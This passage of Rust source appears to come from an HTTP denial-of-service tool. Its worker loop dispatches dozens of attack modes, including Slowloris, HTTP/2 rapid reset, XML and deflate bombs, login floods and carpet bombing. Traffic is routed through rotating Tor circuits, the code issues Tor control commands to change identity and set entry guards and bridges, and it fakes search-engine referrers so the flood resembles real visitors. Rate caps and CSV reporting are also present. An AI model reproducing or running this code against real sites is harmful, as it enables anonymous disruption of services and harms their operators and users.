    // Global token-bucket rate limiter (shared across all workers).
    let mut rate_limiter = RateLimiter::new(rate_limit);
    
    // Global byte-rate pacer for --throughput-cap (shared across all workers).
    // cap == 0 → instant-pass (unlimited), byte-identical behavior to before.
    let byte_pacer = ByteRatePacer::new(throughput_cap_bytes);

    loop {
        if let Some(max_err) = max_errors {
            if stats.errors.load(Ordering::Relaxed) >= max_err {
                println!("  Max errors ({}) reached, stopping.", max_err);
                break;
            }
        }
        if !stats.running.load(Ordering::Relaxed) {
            if stats.abort.load(Ordering::Relaxed) { return; }
            tokio::time::sleep(Duration::from_millis(100)).await; continue;
        }
        
        // Enforce max_requests limit
        if safety.0 > 0 && stats.total_requests.load(Ordering::Relaxed) >= safety.0 {
            println!("  Max requests ({}) reached, stopping.", safety.0);
            stats.abort.store(true, Ordering::Relaxed);
            return;
        }
        
        // Enforce error_rate_threshold
        if safety.2 > 0.0 {
            let total = stats.total_requests.load(Ordering::Relaxed);
            if total > 0 {
                let error_rate = stats.errors.load(Ordering::Relaxed) as f64 / total as f64;
                if error_rate >= safety.2 {
                    println!("  Error rate ({:.2}%) exceeded threshold ({:.2}%), stopping.", error_rate * 100.0, safety.2 * 100.0);
                    stats.abort.store(true, Ordering::Relaxed);
                    return;
                }
            }
        }
        
        let (new_conc, new_jitter, target_url) = {
            let st = state.lock().await;
            (st.load_concurrency, st.jitter_ms, st.target_url.clone())
        };
        if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }

        if new_conc != conc {
            conc = new_conc;
            semaphore = Arc::new(Semaphore::new(conc));
        }
        jitter_ms = new_jitter;

        let (imgs, apis_local, statics_local, _has_isr, _has_cache_bypass, _has_log_drains, _has_storage) = {
            let st = state.lock().await; (st.imgs.clone(), st.apis.clone(), st.statics.clone(), st.has_isr, st.has_cache_bypass, st.has_log_drains, st.has_storage)
        };
        tokio::task::yield_now().await;
        let assets: Arc<Vec<String>> = Arc::new(if use_crawl {
            // #7 (--crawl): every attack mode targets the full discovered
            // surface (imgs + apis + statics) instead of just "/".
            let mut all = imgs.clone();
            all.extend(apis_local.iter().cloned());
            all.extend(statics_local.iter().cloned());
            all.sort();
            all.dedup();
            if all.is_empty() { vec!["/".into()] } else { all }
        } else {
            match attack {
            AttackMode::Normal => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
            AttackMode::Ssr => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
            AttackMode::Middleware => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            AttackMode::AssetSpray => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            _ => vec!["/".into()]
            }
        });

        loop {
            if !stats.running.load(Ordering::Relaxed) { break; }
            let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
            if active_concurrency != conc {
                break; // Recreate semaphore
            }
            
            let _permit = match semaphore.clone().acquire_owned().await { Ok(p) => p, Err(_) => return, };
            
            // Global token-bucket rate limiter: shared across all workers so
            // total request rate never exceeds `rate` req/s regardless of concurrency.
            rate_limiter.pace().await;
            
            // Global throughput cap (--throughput-cap): holds dispatch until the
            // total bytes transmitted so far fit within cap × elapsed. No-op when
            // the cap is unset (0 = unlimited).
            byte_pacer.pace(stats.total_bytes.load(Ordering::Relaxed)).await;
            
            let next_client = match pool.lock() {
                Ok(mut guard) => guard.next(),
                Err(e) => {
                    eprintln!("  Pool lock poisoned: {}", e);
                    continue;
                }
            };
            if let Some((idx, client)) = next_client {
                let stats_clone = stats.clone();
                let assets = assets.clone();
                let target = target_url.clone();
                let sessions_clone = sessions.clone();
                let idx1 = rand::rng().random_range(0..assets.len());
                let pool_clone = pool.clone();
                let apis_clone = apis.clone();
                
                // Determine latency and delay details
                let mut req_delay = delay_ms;
                if req_delay == 0 {
                    req_delay = interval;
                }
                let effective_jitter_ms = jitter_percent
                    .map(|pct| req_delay * pct / 100)
                    .unwrap_or(jitter_ms);
                if effective_jitter_ms > 0 {
                    let mut rng = rand::rng();
                    let min_d = req_delay.saturating_sub(effective_jitter_ms);
                    let max_d = req_delay.saturating_add(effective_jitter_ms);
                    req_delay = rng.random_range(min_d..=max_d);
                }

                let permit_clone = _permit;
                tokio::spawn(async move {
                    let _permit = permit_clone;
                    let start_req = Instant::now();
                    
                    // Realistic referrer trail / navigation funnel logic for Normal/AssetSpray
                    let (req_url, referrer) = if (attack == AttackMode::Normal || attack == AttackMode::AssetSpray) && !assets.is_empty() {
                        let step = rand::rng().random_range(0..3);
                        if step == 0 {
                            (target.clone(), Some("https://www.google.com/".to_string()))
                        } else if step == 1 {
                            (assets[idx1].clone(), Some(target.clone()))
                        } else {
                            let path = if !apis_clone.is_empty() {
                                apis_clone[rand::rng().random_range(0..apis_clone.len())].clone()
                            } else {
                                target.clone()
                            };
                            (path, Some(format!("{}/about", target.trim_end_matches('/'))))
                        }
                    } else {
                        (if assets.is_empty() { target.clone() } else { assets[idx1].clone() }, None)
                    };

                    let result = match attack {
                        AttackMode::Bandwidth => {
                            fetch_bandwidth(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Normal => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SlowRead => {
                            fetch_slow(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ImageOpt => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                        }
                        AttackMode::LargePost => {
                            fetch_post(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::AssetSpray => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::RangeReq => {
                            if assets.is_empty() { fetch_range(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                        }
                        AttackMode::CookieBomb => {
                            fetch_cookie(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Ssr => {
                            fetch_ssr(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Middleware => {
                            fetch_middleware(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::RequestFlood => {
                            fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::NotFound => {
                            let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Slowloris => {
                            fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::HeaderBomb => {
                            fetch_headerbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::QueryFlood => {
                            fetch_queryflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::DeepPath => {
                            fetch_deeppath(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::AuthFlood => {
                            fetch_authflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CacheBypass => {
                            fetch_cachebypass(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::FormMulti => {
                            fetch_formmulti(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::XmlBomb => {
                            fetch_xmlbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::GraphqlFlood => {
                            fetch_graphqlflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::RedirectLoop => {
                            fetch_redirectloop(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::EmptyBody => {
                            fetch_emptybody(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ChunkedFlood => {
                            fetch_chunkedflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::TrailHeaders => {
                            fetch_trailheaders(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ConnectionClose => {
                            fetch_connectionclose(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Expect100 => {
                            fetch_expect100(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::VaryFlood => {
                            fetch_varyflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::DeflateBomb => {
                            fetch_deflatebomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::TraceAmplify => {
                            fetch_traceamplify(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::HostPoison => {
                            fetch_hostpoison(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ConditionalFlood => {
                            fetch_conditionalflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CorsFlood => {
                            fetch_corsflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::PutFlood => {
                            fetch_putflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::DeleteFlood => {
                            fetch_deleteflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SessionFlood => {
                            fetch_sessionflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ContentTypeFlood => {
                            fetch_contenttypeflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::UpgradeAmplify => {
                            fetch_upgradeamplify(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::HeadFlood => {
                            fetch_headflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::OptionsFlood => {
                            fetch_optionsflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::PatchFlood => {
                            fetch_patchflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SlowPost => {
                            fetch_slowpost(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::JsonBomb => {
                            fetch_jsonbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ContentNegotiate => {
                            fetch_contentnegotiate(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::PreferFlood => {
                            fetch_preferflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::RangeOverlap => {
                            fetch_rangeoverlap(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::MultiPost => {
                            fetch_multipost(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CspReport => {
                            fetch_cspreports(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ConnectFlood => {
                            fetch_connectflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::KeepAliveFlood => {
                            fetch_keepaliveflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::LinkFlood => {
                            fetch_linkflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ForwardedFlood => {
                            fetch_forwardedflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::HealthFlood => {
                            fetch_healthflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::JwtExplode => {
                            fetch_jwtexplode(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::UploadFlood => {
                            fetch_uploadflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::GraphqlIntrospect => {
                            fetch_graphqlintrospect(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::AdminFlood => {
                            fetch_adminflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ParamFlood => {
                            fetch_paramflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::TEFlood => {
                            fetch_teflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::WantDigestFlood => {
                            fetch_wantdigestflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SaveDataFlood => {
                            fetch_savedataflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SecFetchFlood => {
                            fetch_secfetchflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CsvBomb => {
                            fetch_csvbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SerializedBomb => {
                            fetch_serializedbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::WellKnownFlood => {
                            fetch_wellknownflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SwaggerFlood => {
                            fetch_swaggerflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::LoginFlood => {
                            fetch_loginflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::MethodOverrideFlood => {
                            fetch_methodoverrideflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CookieBomb2 => {
                            fetch_cookiebomb2(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::GraphqlBatch => {
                            fetch_graphqlbatch(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::WebhookFlood => {
                            fetch_webhookflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ApiVersionFlood => {
                            fetch_apiversionflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::PrototypeFlood => {
                            fetch_prototypeflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::JsonpFlood => {
                            fetch_jsonpflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ArrayFlood => {
                            fetch_arrayflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SitemapFlood => {
                            fetch_sitemapflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::UnicodeFlood => {
                            fetch_unicodeflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::ParamDuplicate => {
                            fetch_paramduplicate(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CacheBusterFlood => {
                            fetch_cachebusterflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::FileEnumFlood => {
                            fetch_fileenumflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SoapFlood => {
                            fetch_soapflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::SignedHeaderFlood => {
                            fetch_signedheaderflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::Utf8BomFlood => {
                            fetch_utf8bomflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::DoubleDotFlood => {
                            fetch_doubledotflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::EmptyParamFlood => {
                            fetch_emptyparamflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::HeaderOrderFlood => {
                            fetch_headerorderflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CrossDomainFlood => {
                            fetch_crossdomainflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::RefererFlood => {
                            fetch_refererflood(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::H2RapidReset => {
                            fetch_h2rapidreset(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::CarpetBomb => {
                            fetch_carpetbomb(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                        }
                        AttackMode::WebSocketFlood => {
                            // Real WS handshake + 100 binary frames per tick (through the same Tor circuit as HTTP requests from this slot).
                            let proxy_url = match pool_clone.lock() {
                                Ok(guard) => guard.proxy_for(idx),
                                Err(e) => { eprintln!("  Pool lock poisoned: {}", e); None }
                            };
                            fetch_websocket_flood(target.clone(), req_delay, verbose, insecure, 100, proxy_url.as_deref()).await
                        }
                        AttackMode::H2StreamFlood => {
                            // Real HTTP/2 multiplexing: 50 concurrent streams per tick (through the same Tor circuit as HTTP requests from this slot).
                            let proxy_url = match pool_clone.lock() {
                                Ok(guard) => guard.proxy_for(idx),
                                Err(e) => { eprintln!("  Pool lock poisoned: {}", e); None }
                            };
                            fetch_h2_stream_flood(target.clone(), req_delay, verbose, insecure, 50, proxy_url.as_deref()).await
                        }
                    };
                    let latency = start_req.elapsed().as_millis() as u64;
                    stats_clone.latency_samples.record(latency as u32);
                    if let Ok(mut g) = stats_clone.interval_latency.lock() {
                        g.push(latency as u32);
                    }
                    
                    match result {
                        Ok((bytes, status)) => {
                            stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
                            stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
                            stats_clone.total_latency_ms.fetch_add(latency, Ordering::Relaxed);
                            match status {
                                200..=299 => { stats_clone.status_2xx.fetch_add(1, Ordering::Relaxed); }
                                300..=399 => { stats_clone.status_3xx.fetch_add(1, Ordering::Relaxed); }
                                400..=499 => { stats_clone.status_4xx.fetch_add(1, Ordering::Relaxed); }
                                500..=599 => {
                                    stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed);
                                    // Server errors mean the target circuit/proxy is unhealthy —
                                    // penalize it so the pool deprioritizes/rotates it, instead of
                                    // treating a 100%-5xx circuit as perfectly healthy.
                                    match pool_clone.lock() {
                                        Ok(mut guard) => { guard.report_failure(idx); }
                                        Err(e) => { eprintln!("  Pool lock poisoned: {}", e); }
                                    }
                                }
                                _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
                            }
                            // Per-status-code histogram (lock-free array indexed by code-100).
                            {
                                let code = status;
                                if (100..=999).contains(&code) {
                                    stats_clone.status_hist[code as usize - 100].fetch_add(1, Ordering::Relaxed);
                                }
                            }
                            if !(500..=599).contains(&status) {
                                match pool_clone.lock() {
                                    Ok(mut guard) => guard.report_success(idx, latency),
                                    Err(e) => {
                                        eprintln!("  Pool lock poisoned: {}", e);
                                    }
                                }
                            }
                        }
                        Err(err) => {
                            if err.downcast_ref::<reqwest::Error>().is_some_and(|e| e.is_timeout()) {
                                stats_clone.error_timeout.fetch_add(1, Ordering::Relaxed);
                            } else if err.downcast_ref::<reqwest::Error>().is_some_and(|e| e.is_connect()) {
                                stats_clone.error_connect.fetch_add(1, Ordering::Relaxed);
                            } else {
                                stats_clone.error_other.fetch_add(1, Ordering::Relaxed);
                            }
                            stats_clone.errors.fetch_add(1, Ordering::Relaxed);
                            match pool_clone.lock() {
                                Ok(mut guard) => guard.report_failure(idx),
                                Err(e) => {
                                    eprintln!("  Pool lock poisoned: {}", e);
                                }
                            }
                        }
                    }
                });
            } else {
                tokio::task::yield_now().await;
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }
        
        let sleep_time = if interval == 0 { 1 } else { interval };
        tokio::time::sleep(Duration::from_millis(sleep_time)).await;
    }
}


pub(crate) fn write_probe_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode\n{},{},{},{},{}\n", target, status_escaped, proxies.len(), concurrency, attack);
    if let Err(e) = std::fs::write(path, content) {
        eprintln!("  Failed to write CSV to {}: {}", path, e);
    } else {
        println!("  CSV written to {}", path);
    }
}

/// Write the per-interval latency time-series to CSV. One row per stats
/// interval with the percentile snapshot for that window — this is the
/// degradation curve (p99 rising over time) that a single whole-run
/// percentile set hides.
pub(crate) fn write_timeseries_csv(path: &str, points: &[crate::types::TimeSeriesPoint]) {
    use std::io::Write;
    let mut out = String::from("elapsed_s,requests,errors,bytes,p50_ms,p90_ms,p95_ms,p99_ms\n");
    for p in points {
        out.push_str(&format!(
            "{},{},{},{},{},{},{},{}\n",
            p.elapsed_secs, p.req_count, p.error_count, p.bytes, p.p50, p.p90, p.p95, p.p99
        ));
    }
    match std::fs::OpenOptions::new().create(true).write(true).truncate(true).open(path) {
        Ok(mut f) => {
            if let Err(e) = f.write_all(out.as_bytes()) {
                eprintln!("  Failed to write time-series CSV to {}: {}", path, e);
            } else {
                println!("  Time-series CSV written to {} ({} points)", path, points.len());
            }
        }
        Err(e) => eprintln!("  Failed to open time-series CSV {}: {}", path, e),
    }
}

pub(crate) fn write_results_csv(path: &str, params: ResultsCsvParams<'_>) {
    let status_escaped = params.status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{},{:.2}\n",
        params.target, status_escaped, params.proxies.len(), params.concurrency, params.attack,
        params.total_reqs, params.total_bytes, params.duration, params.total_bytes as f64 / params.duration as f64 / 1024.0);
    if let Err(e) = std::fs::write(path, content) {
        eprintln!("  Failed to write CSV to {}: {}", path, e);
    } else {
        println!("  CSV written to {}", path);
    }
}

/// Resolve a Tor control address to a connection target.
/// Unix socket paths are returned as `(path, "unix")`. TCP addresses are parsed
/// into `(host, port)`; if the port is omitted, the default Tor control port
/// `9051` is used. A bare numeric value is treated as a port on `127.0.0.1`.
pub(crate) fn resolve_control_addr(addr: &str) -> Result<(String, String), String> {
    if addr.is_empty() {
        return Err("control address is empty".to_string());
    }
    // Unix socket path
    if addr.starts_with('/') {
        return Ok((addr.to_string(), "unix".to_string()));
    }
    // IPv6 bracketed form [host]:port
    if addr.starts_with('[') {
        let Some((host, port)) = addr.rsplit_once(':') else {
            return Err("IPv6 control address is missing port".to_string());
        };
        let host = host
            .strip_prefix('[')
            .and_then(|h| h.strip_suffix(']'))
            .ok_or_else(|| "invalid IPv6 bracketed control address".to_string())?;
        let port = port
            .parse::<u16>()
            .map_err(|e| format!("invalid control port: {}", e))?;
        return Ok((host.to_string(), port.to_string()));
    }
    // IPv4 or hostname with optional port
    match addr.rsplit_once(':') {
        Some((host, port)) => {
            let port = port
                .parse::<u16>()
                .map_err(|e| format!("invalid control port: {}", e))?;
            Ok((host.to_string(), port.to_string()))
        }
        None => {
            // A bare number is treated as a port on localhost for compatibility.
            if let Ok(port) = addr.parse::<u16>() {
                Ok(("127.0.0.1".to_string(), port.to_string()))
            } else {
                Ok((addr.to_string(), "9051".to_string()))
            }
        }
    }
}

/// Read the Tor control cookie file for cookie authentication.
pub(crate) fn read_control_cookie(_socket_path: &str) -> Option<String> {
    // Try common cookie locations
    let cookie_paths = [
        "/var/lib/tor/control_auth_cookie",
        "/home/tor/.config/tor/auth_cookie",
        "/run/tor/control_auth_cookie",
        "/run/tor/control.authcookie",
        "/var/run/tor/control_auth_cookie",
        "/var/run/tor/control.authcookie",
        "/home/tor/.local/share/tor/control_auth_cookie",
    ];
    for p in &cookie_paths {
        if let Ok(bytes) = std::fs::read(p) {
            // Cookie is hex-encoded bytes; most modern Tor installs write 32 raw bytes
            // (no length prefix). Older formats had a 2-byte length prefix — try both.
            if bytes.len() > 2 {
                // Try without length prefix first (modern format)
                let hex_str: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
                if hex_str.len() == 64 {
                    return Some(hex_str);
                }
                // Fall back: try skipping 2-byte length prefix
                let hex_str: String = bytes[2..].iter().map(|b| format!("{:02x}", b)).collect();
                if hex_str.len() == 64 {
                    return Some(hex_str);
                }
            }
        }
    }
    None
}

/// Send a command over a Tor control connection with optional cookie auth.
/// Supports both TCP and Unix socket connections.
pub(crate) async fn tor_control_command(
    control_addr: &str,
    command: &str,
) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let (conn_target, conn_type) = resolve_control_addr(control_addr)?;

    // Helper: send bytes and read response with a timeout
    pub(crate) async fn send_and_read(
        stream: &mut (impl tokio::io::AsyncWrite + tokio::io::AsyncRead + Unpin + Send),
        data: &[u8],
        read_timeout_secs: u64,
    ) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        stream.write_all(data).await?;
        stream.flush().await?;
        let mut buf = [0u8; 4096];
        let n = {
            use tokio::time::{timeout, Duration};
            let read_result = timeout(Duration::from_secs(read_timeout_secs), stream.read(&mut buf)).await;
            read_result.unwrap_or(Ok(0))?
        };
        Ok(std::str::from_utf8(&buf[..n]).unwrap_or("").trim().to_string())
    }

    if conn_type == "unix" {
        use tokio::net::UnixStream;
        let mut stream = UnixStream::connect(&conn_target).await?;
        let cookie = read_control_cookie(&conn_target);
        let auth_result = if let Some(ref cookie_hex) = cookie {
            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
        } else {
            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
        };

        if !auth_result.contains("250 OK") {
            return Err(format!("Auth failed: {}", auth_result).into());
        }

        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
        Ok(response)
    } else {
        let tcp_addr = format!("{}:{}", conn_target, conn_type);
        let mut stream = tokio::net::TcpStream::connect(&tcp_addr).await?;
        let cookie = read_control_cookie(&tcp_addr);
        let auth_result = if let Some(ref cookie_hex) = cookie {
            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
        } else {
            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
        };

        if !auth_result.contains("250 OK") {
            return Err(format!("Auth failed: {}", auth_result).into());
        }

        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
        Ok(response)
    }
}


pub(crate) async fn cycle_tor_circuit(control_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let resp = tor_control_command(control_addr, "SIGNAL NEWNYM\r\n").await?;
    if !resp.contains("250") {
        eprintln!("  [Tor] NEWNYM response: {}", resp);
    }
    Ok(())
}


pub(crate) async fn configure_tor(
    control_addr: &str,
    entry_guards: Option<&str>,
    bridges: Option<&str>,
    circuit_timeout: Option<u64>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    if let Some(guards) = entry_guards {
        let cmd = format!("SETCONF EntryNodes=\"{}\" StrictNodes=1\r\n", guards);
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF EntryNodes response: {}", resp);
        }
    }

    if let Some(brs) = bridges {
        let mut cmd = "SETCONF UseBridges=1".to_string();
        for br in brs.split(';') {
            let trimmed = br.trim();
            if !trimmed.is_empty() {
                cmd.push_str(&format!(" Bridge=\"{}\"", trimmed));
            }
        }
        cmd.push_str("\r\n");
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF bridges response: {}", resp);
        }
    }

    if let Some(timeout) = circuit_timeout {
        let cmd = format!("SETCONF CircuitBuildTimeout={}\r\n", timeout);
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF timeout response: {}", resp);
        }
    }

    Ok(())
}


